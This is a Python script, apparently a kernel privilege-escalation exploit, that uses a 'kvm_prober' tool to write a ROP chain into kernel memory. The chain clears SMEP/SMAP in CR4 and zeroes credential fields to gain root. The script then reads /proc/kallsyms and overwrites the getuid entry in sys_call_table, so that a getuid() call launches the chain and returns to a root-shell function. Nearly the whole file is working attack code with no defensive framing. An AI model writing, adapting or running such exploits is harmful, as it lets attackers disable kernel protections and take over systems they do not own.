#!/usr/bin/env python3
import struct
import subprocess
import time

# Target kernel VA where ROP chain will be placed
ROP_VA_BASE = 0xffffffff820a0000

# Your full ROP chain here (update if different)
rop_chain = [
    0xffffffff8d200000 + 0x121ed08,  # mov rbx, cr4
    0xffffffff8d200000 + 0x1b967b7,  # pop rax
    ~(1 << 20 | 1 << 21) & 0xffffffffffffffff,  # clear SMEP/SMAP
    0xffffffff8d200000 + 0x1a44582,  # and rbx, rax
    0xffffffff8d200000 + 0x1b90022,  # mov rax, rbx
    0xffffffff8d200000 + 0x1b8cea6,  # mov cr4, rax

    0xffffffff8d200000 + 0x1b967b7,  # pop rax
    0x0,  # dummy
    0xffffffff8d200000 + 0x17a1a91,  # GS segment gadget
    0xffffffff8d200000 + 0x1b90a9d,  # mov rax, rsi

    0xffffffff8d200000 + 0x1b9672a,  # pop rbx
    0x1e4,
    0xffffffff8d200000 + 0x1b8a60e,  # pop r11
    0xffffffff86852640,             # init_cred
    0xffffffff8d200000 + 0x260a06,  # write 0 to cred

    0xffffffff8d200000 + 0x1b9672a,  # pop rbx
    0x1e8,
    0xffffffff8d200000 + 0x1b8a60e,  # pop r11
    0xffffffff86852640,             # init_cred
    0xffffffff8d200000 + 0x260a06,  # write 0 to cred

    0xffffffff8d200000 + 0x155fecf,  # swapgs ; jmp ...
    0xdeadbeefdeadbeef,  # get_root_shell addr (patched later)
    0x33,                # CS
    0x202,               # RFLAGS
    0x4141414141414141,  # RSP (patched later)
    0x2b                 # SS
]

def write_qword_to_kernel(address, value):
    hex_val = f"{value:016x}"
    payload = subprocess.run([
        "kvm_prober", "writekvmem", f"{address:#x}", hex_val
    ], capture_output=True)
    if payload.returncode != 0:
        print(f"[!] Failed to write to {address:#x}: {payload.stderr.decode()}")
    else:
        print(f"[+] Wrote 0x{value:016x} to {address:#x}")

def main():
    print("[*] Starting ROP chain kernel write...")
    for i, val in enumerate(rop_chain):
        addr = ROP_VA_BASE + i * 8
        write_qword_to_kernel(addr, val)

    # Resolve get_root_shell VA dynamically from no-buffer binary
    nm_out = subprocess.check_output(["nm", "./no-buffer"]).decode()
    get_root_va = int([
        line.split()[0]
        for line in nm_out.splitlines()
        if "get_root_shell" in line
    ][0], 16)

    print("[+] Done! Your ROP chain now lives at:")
    print(f"    ROP VA:  {ROP_VA_BASE:#x}")

    # Patch in real address of get_root_shell
    print(f"[*] Patching get_root_shell address: {get_root_va:#x}")
    get_root_offset = rop_chain.index(0xdeadbeefdeadbeef)
    write_qword_to_kernel(ROP_VA_BASE + get_root_offset * 8, get_root_va)

    print("[*] Saving ROP address to /tmp/skp_rop_addr.txt")
    with open("/tmp/skp_rop_addr.txt", "w") as f:
        f.write(f"0x{ROP_VA_BASE:x}")

    print("[*] Hooking low-risk syscall (getuid)")
    # Get getuid() syscall handler offset
    sys_call_table_addr = int(subprocess.check_output(
        "cat /proc/kallsyms | grep sys_call_table | awk '{print $1}'",
        shell=True).decode().strip(), 16)
    getuid_index = 102  # __NR_getuid on x86_64
    getuid_handler_addr = sys_call_table_addr + getuid_index * 8
    print(f"[*] Overwriting sys_call_table[102] @ {getuid_handler_addr:#x} to ROP chain")
    write_qword_to_kernel(getuid_handler_addr, ROP_VA_BASE)
    print("[+] Trigger by calling getuid() to launch ROP")

if __name__ == "__main__":
    main()
